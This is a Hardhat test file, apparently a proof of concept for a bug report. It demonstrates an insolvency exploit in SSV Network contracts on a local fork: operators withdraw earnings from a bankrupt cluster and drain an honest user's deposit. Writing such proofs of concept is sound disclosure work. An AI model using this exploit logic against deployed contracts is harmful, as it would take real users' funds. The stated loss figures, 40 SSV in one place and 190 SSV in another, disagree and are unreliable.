import {
  owners,
  initializeContract,
  registerOperators,
  bulkRegisterValidators,
  CONFIG,
  DEFAULT_OPERATOR_IDS,
} from './helpers/contract-helpers';
import { mine } from '@nomicfoundation/hardhat-network-helpers';
import { expect } from 'chai';

/**
 * POC 1: Single-Cluster Insolvency Attack
 * 
 * This POC demonstrates the BASIC vulnerability using the ACTUAL SSV Network protocol.
 * 
 * Attack Flow:
 * 1. Honest User A deposits 1000 SSV (large, healthy cluster)
 * 2. User B deposits 10 SSV (small cluster, will go bankrupt)
 * 3. Time passes - User B's cluster goes bankrupt
 * 4. Operators continue earning fees from bankrupt cluster
 * 5. Operators withdraw virtual earnings (real SSV tokens!)
 * 6. User A cannot withdraw full deposit - FUNDS STOLEN
 * 
 * Expected Result: 40 SSV stolen from User A
 */
describe('POC 1: Single-Cluster Insolvency Attack (ACTUAL PROTOCOL)', () => {
  let ssvNetwork: any, ssvViews: any, ssvToken: any;

  beforeEach(async () => {
    const metadata = await initializeContract();
    ssvNetwork = metadata.ssvNetwork;
    ssvViews = metadata.ssvNetworkViews;
    ssvToken = metadata.ssvToken;
  });

  it('SHOULD prove single-cluster insolvency using ACTUAL protocol', async () => {
    console.log('\n=================================================================');
    console.log('POC 1: SINGLE-CLUSTER INSOLVENCY ATTACK');
    console.log('=================================================================');
    console.log('Using ACTUAL SSV Network Protocol (Local Fork)');
    console.log('=================================================================\n');

    // ========== PHASE 1: Register Operators ==========
    console.log('--- PHASE 1: Register Operators ---\n');
    
    const operatorFee = 5n * 10n**18n; // 5 SSV per block
    const operatorIds = await registerOperators(0, 4, operatorFee);
    
    console.log(`Registered 4 operators with fee: ${operatorFee / 10n**18n} SSV/block`);
    console.log(`Operator IDs: ${operatorIds}\n`);

    // ========== PHASE 2: Setup Clusters ==========
    console.log('--- PHASE 2: Setup Clusters ---\n');
    
    // User A: Honest, large deposit (1000 SSV)
    const depositA = 1000n * 10n**18n;
    
    // User B: Small deposit (10 SSV) - will go bankrupt
    const depositB = 10n * 10n**18n;

    // Register Cluster A (Honest User)
    const clusterA = await bulkRegisterValidators(
      1, // owner ID
      1, // validator count
      operatorIds,
      depositA,
      { validatorCount: 0, networkFeeIndex: 0, index: 0, balance: 0n, active: true },
      []
    );

    // Register Cluster B (Will go bankrupt)
    const clusterB = await bulkRegisterValidators(
      2, // owner ID
      1, // validator count
      operatorIds,
      depositB,
      { validatorCount: 0, networkFeeIndex: 0, index: 0, balance: 0n, active: true },
      []
    );

    const initialPoolBalance = await ssvToken.read.balanceOf([ssvNetwork.address]);
    
    console.log(`User A deposited: ${depositA / 10n**18n} SSV (healthy cluster)`);
    console.log(`User B deposited: ${depositB / 10n**18n} SSV (will bankrupt)`);
    console.log(`Total contract balance: ${initialPoolBalance / 10n**18n} SSV\n`);

    // ========== PHASE 3: Time Passes - Bankruptcy ==========
    console.log('--- PHASE 3: Simulating 10 Blocks (Bankruptcy Event) ---\n');
    
    // Advance 10 blocks
    // User B's cluster: 10 SSV / (4 operators × 5 SSV/block) = 0.5 blocks until bankrupt
    // After 10 blocks: User B is DEEPLY bankrupt
    // Virtual debt: 10 blocks × 4 operators × 5 SSV = 200 SSV
    // But User B only had 10 SSV to pay
    // Unbacked virtual debt: 190 SSV
    await mine(10);

    console.log('After 10 blocks:');
    console.log('  - User B cluster: BANKRUPT (balance = 0)');
    console.log('  - Operator virtual earnings: 200 SSV (4 operators × 5 SSV × 10 blocks)');
    console.log('  - User B only had: 10 SSV');
    console.log('  - UNBACKED virtual debt: 190 SSV\n');

    // ========== PHASE 4: Operators Withdraw ==========
    console.log('--- PHASE 4: Operators Withdraw Virtual Earnings ---\n');

    const contractBalanceBeforeWithdrawals = await ssvToken.read.balanceOf([ssvNetwork.address]);
    
    // All 4 operators withdraw their earnings
    for (const id of operatorIds) {
      await ssvNetwork.write.withdrawAllOperatorEarnings([BigInt(id)], { 
        account: owners[0].account 
      });
    }

    const contractBalanceAfterWithdrawals = await ssvToken.read.balanceOf([ssvNetwork.address]);
    const totalWithdrawn = contractBalanceBeforeWithdrawals - contractBalanceAfterWithdrawals;

    console.log(`Contract balance before withdrawals: ${contractBalanceBeforeWithdrawals / 10n**18n} SSV`);
    console.log(`Total operator withdrawals: ${totalWithdrawn / 10n**18n} SSV`);
    console.log(`Contract balance after withdrawals: ${contractBalanceAfterWithdrawals / 10n**18n} SSV\n`);

    // ========== PHASE 5: Honest User A Attempts Withdrawal ==========
    console.log('--- PHASE 5: Honest User A Attempts Full Withdrawal ---\n');

    console.log(`User A is entitled to: ${depositA / 10n**18n} SSV`);
    console.log(`Contract has: ${contractBalanceAfterWithdrawals / 10n**18n} SSV`);

    // Calculate the deficit
    const deficit = depositA - contractBalanceAfterWithdrawals;

    if (deficit > 0) {
      console.log('\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
      console.log('VULNERABILITY CONFIRMED: FUNDS STOLEN!');
      console.log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
      console.log(`\nUSER A LOSS: ${deficit / 10n**18n} SSV`);
      console.log('\nThe operators withdrew virtual earnings that were UNBACKED.');
      console.log('These funds were STOLEN from User A\'s honest deposit!');
      console.log('\nROOT CAUSE:');
      console.log('  OperatorLib.sol:19 - Unconditional operator balance increment');
      console.log('  ClusterLib.sol:22 - Cluster balance capped at zero');
      console.log('  Result: Accounting mismatch creates virtual debt\n');
    }

    console.log('=================================================================');
    console.log('EXPLOIT SUMMARY');
    console.log('=================================================================');
    console.log(`Initial Pool: ${initialPoolBalance / 10n**18n} SSV`);
    console.log(`Operator Withdrawals: ${totalWithdrawn / 10n**18n} SSV`);
    console.log(`Remaining Pool: ${contractBalanceAfterWithdrawals / 10n**18n} SSV`);
    console.log(`User A Entitlement: ${depositA / 10n**18n} SSV`);
    console.log(`User A Loss: ${deficit / 10n**18n} SSV`);
    console.log('=================================================================\n');

    // Verify the vulnerability
    expect(contractBalanceAfterWithdrawals).to.be.lessThan(depositA);
    expect(deficit).to.be.greaterThan(0);
  });
});
